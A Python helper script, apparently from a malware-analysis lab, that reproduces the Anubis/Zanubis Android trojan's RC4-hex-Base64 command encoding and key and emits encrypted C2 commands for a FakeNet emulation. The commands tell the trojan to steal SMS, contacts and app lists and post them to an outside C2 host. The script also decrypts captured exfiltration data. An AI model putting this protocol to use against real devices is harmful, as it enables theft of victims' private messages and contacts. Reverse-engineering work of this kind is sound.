"""
compute_cmd.py - Calcula el comando cifrado para FakeNet (Anubis)

Replica exactamente b.java -> b(String str, String str2):
    1. RC4_encrypt(plaintext.getBytes("UTF-8"), key.getBytes("UTF-8"))
    2. hex_encode(encrypted_bytes)     <- Integer.toString(b & 0xFF, 16) con padding
    3. Base64(hex_string.getBytes())   <- android.util.Base64 flag DEFAULT (sin wrap)

Uso:
    python compute_cmd.py
"""

import base64


def rc4(key, data) -> bytes:
    key_bytes = key.encode("utf-8") if isinstance(key, str) else bytes(key)
    data_bytes = data.encode("utf-8") if isinstance(data, str) else bytes(data)

    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key_bytes[i % len(key_bytes)]) % 256
        S[i], S[j] = S[j], S[i]

    out = []
    i = j = 0
    for byte in data_bytes:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])

    return bytes(out)


def encrypt_b_java(plaintext: str, key: str) -> str:
    """
    Cifra igual que b.java b(String str, String str2).
    El resultado es lo que va dentro de <tag>...</tag> en FakeNet.
    """
    encrypted = rc4(key, plaintext)
    # b.java a(byte[]) -> Integer.toString(b & 0xFF, 16) con padding a 2 chars
    hex_str = "".join(f"{b:02x}" for b in encrypted)
    # Base64.encodeToString(..., DEFAULT=0) -> estandar con \n al final en Android
    # base64.b64encode equivale a NO_WRAP pero Android DEFAULT lo acepta igual al decodificar
    return base64.b64encode(hex_str.encode("ascii")).decode("ascii")


KEY = "zanubis"

COMMANDS = [
    "9999::GetSWSGO::|replaceurl=http://cdnjs.su|endurl",   # Roba SMS + guarda URL en SharedPrefs -> POST a6.php
    "9999::getapps::|replaceurl=http://cdnjs.su|endurl",    # Lista apps + guarda URL en SharedPrefs -> POST a6.php
    "9999::nymBePsG0::|replaceurl=http://cdnjs.su|endurl",  # Roba contactos + guarda URL -> POST a6.php
    "9999::getpermissions::",                                 # Estado de permisos -> POST a6.php
]

if __name__ == "__main__":
    print("=" * 60)
    print("Comandos cifrados para FakeNet (HttpStaticString en a4.php)")
    print("=" * 60)
    for cmd in COMMANDS:
        enc = encrypt_b_java(cmd, KEY)
        print(f"\ncmd : {cmd}")
        print(f"ini : <tag>{enc}</tag>")
    print()
    print("Instrucciones:")
    print("  1. Copia la linea 'ini' del comando deseado")
    print("  2. Pega como HttpStaticString en [Anubis_Commands_SWS]")
    print("     en el fichero anubis_http_sws.ini")
    print("  3. Lanza FakeNet con anubis_sws.ini")
    print("  4. Lanza el malware (Frida NO es necesario para GetSWSGO/getapps)")
    print("     El |replaceurl| del comando persiste la URL en SharedPrefs")
    print("     antes de que la Activity de exfiltracion arranque.")
    print("  5. El POST a /o1o/a6.php con los datos se vuelca en http_*.txt")
    print()
    print("Para descifrar el POST capturado en http_*.txt:")
    print("  El parametro 'p' contiene: Base64(hex(RC4(botid+'|'+data+'|', 'zanubis')))")
    print("  Ejecuta: python compute_cmd.py --decrypt <valor_p>")

    import sys
    if len(sys.argv) == 3 and sys.argv[1] == "--decrypt":
        import binascii
        import urllib.parse
        # El parametro p puede estar URL-encoded
        p_value = urllib.parse.unquote(sys.argv[2])
        # Base64 decode -> hex string bytes
        raw = base64.b64decode(p_value)
        hex_str = raw.decode("ascii")
        # Hex decode -> encrypted bytes
        enc_bytes = binascii.unhexlify(hex_str)
        # RC4 es simetrico: decrypt = rc4(key, ciphertext)
        decrypted = rc4(KEY, enc_bytes)
        print("\nDatos descifrados:")
        print(decrypted.decode("utf-8", errors="replace"))
